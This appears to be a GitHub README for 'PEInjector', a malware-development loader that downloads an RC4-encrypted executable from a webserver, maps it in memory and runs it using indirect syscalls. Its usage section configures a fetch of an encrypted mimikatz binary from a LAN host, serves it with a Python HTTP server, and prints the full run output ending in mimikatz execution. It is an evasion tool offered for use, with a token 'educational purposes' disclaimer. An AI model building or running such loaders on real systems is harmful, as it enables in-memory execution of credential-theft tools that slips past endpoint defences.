# PEInjector
A simple PE injector that downloads encrypted PE executable from a webserver maps it in the current process
fixes all relocations and imports and executes its entrypoint.

## Features
  - Make use of indirect syscalls 
  
  - Downloads the PE from a webserver, or reads it from a local file (mainly for testing)
  
  - RC4 encryption for the PE
  
  - Able to run EXE or DLL (along with an exported func from the DLL)
  
  - Pass arguments to the PE that will be executed
  
  
## TODO
  - Remove the need for LoadLibrary and GetProcAddress to resolve the PE's import table
  - Remove the need for the CRT library
  - Download the encryption key along with the payload
  

## Usage
Most of the configuration options are located in `main.h`, just configure, compile and run.
```c
/*---------------------------
 Read from web or local file
---------------------------*/
#define WEB 80
//#define SECURE 443

#define HOST L"192.168.100.161"
#define REMOTE_FILE L"mimikatz-enc.bin"
//#define LOCAL_FILE "C:\\Users\\nullb1t3\\Desktop\\mimikatz-enc.bin"

#define PE_ARGS "coffee exit"
//#define DLL_EXPORTED_FUNC "someExportedFunc"    //in case of DLLs

/*------------------
  Debug output
------------------*/
#define DEBUG
```

 - Encrypt a payload [PayloadEncryptor](https://github.com/vgeorgiev90/MalDevAcademy/tree/master/PayloadEncryptor)
 ```powershell
PS C:\Users\nullb1t3\Desktop> .\PayloadEncryptor.exe C:\Users\nullb1t3\Desktop\mimikatz.exe C:\Users\nullb1t3\Desktop\mimikatz-enc.bin
Reading file: C:\Users\nullb1t3\Desktop\mimikatz.exe
XORing the encryption key.
Doing some magick.
Writing data to: C:\Users\nullb1t3\Desktop\mimikatz-enc.bin

PS C:\Users\nullb1t3\Desktop> python -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
 ```
 
 - Run it, by downloading the PE from a webserver or read it from a file locally (debug output can be turned off)
 ```powershell
 PS C:\Users\nullb1t3\Desktop> .\PEInjector.exe
[*] Initializing syscalls structure.
[*] Fetching information about syscall: 0x6E8AC28E.
[*] Initializing NT structure.
[*] PEB: 0x0000002998BE9000

[*] ntdll base: 0x00007FFB496B0000
[*] Names array: 0x00007FFB498047B4
[*] Addresses array: 0x00007FFB498021A8
[*] Ordinals array: 0x00007FFB49806DBC
[*] Names offset: 0x00007FFB498047B4
[*] Addrs offset: 0x00007FFB498021A8
[*] Ordls offset: 0x00007FFB49806DBC
[*] Number of functions: 2434

[*] Init NT struct finished.
[*] Found a jump address for indirect syscall: 0x00007FFB4974D3E2.
[*] Fetching information about syscall: 0x1DA5BB2B.
[*] Found a jump address for indirect syscall: 0x00007FFB4974DAE2.
[*] Fetching information about syscall: 0x6299AD3D.
[*] Found a jump address for indirect syscall: 0x00007FFB4974D162.
[*] Fetching information about syscall: 0x8EC0B84A.
[*] Found a jump address for indirect syscall: 0x00007FFB4974E912.
[*] Fetching information about syscall: 0x369BD981.
[*] Found a jump address for indirect syscall: 0x00007FFB4974D2C2.

[*] NtAllocateVirtualMemory SSN: 24.
[*] NtCreateThreadEx SSN: 194.
[*] NtProtectVirtualMemory SSN: 80.
[*] NtWaitForSingleObject SSN: 4.
[*] NtClose SSN: 15.
[*] Init done!

[*] Downloaded the PE with size: 1355264
[*] Decrypting the PE with size: 1355264.
[*] Decrypted!
[*] Parsing loaded PE file's headers
[*] Populating Data Directories
[*] Parsing finished
[*] Allocating memory with size: 1372160
[*] Copying PE sections in the allocated memory with start address: 0x000001E787590000
[*] Finished
[*] Attempting to apply base relocaitons
[*] Finished applying relocations
[*] Resolving the PE's import table
[*] Reached the end of the import descriptors array
[*] Fixing sections memory permissions, number of sections: 6
[*] Checking memory protection for section: 0
        > PAGE_READONLY
        > PAGE_EXECUTE
        > PAGE_EXECUTE_READ
[*] Checking memory protection for section: 1
        > PAGE_READONLY
[*] Checking memory protection for section: 2
        > PAGE_WRITECOPY
        > PAGE_READONLY
        > PAGE_READWRITE
[*] Checking memory protection for section: 3
        > PAGE_READONLY
[*] Checking memory protection for section: 4
        > PAGE_READONLY
[*] Checking memory protection for section: 5
        > PAGE_READONLY
[*] Finished applying sections memory protections
[*] Finished patching command line arguments
[*] PE Output:


  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz(commandline) # exit
Bye!
 ```


## Credits
- @mr.d0x @NUL0x4C and @5pider and the incredible [Maldev academy](https://maldevacademy.com/)


## Disclaimer
As always this simple tool is created for educational purposes only ! 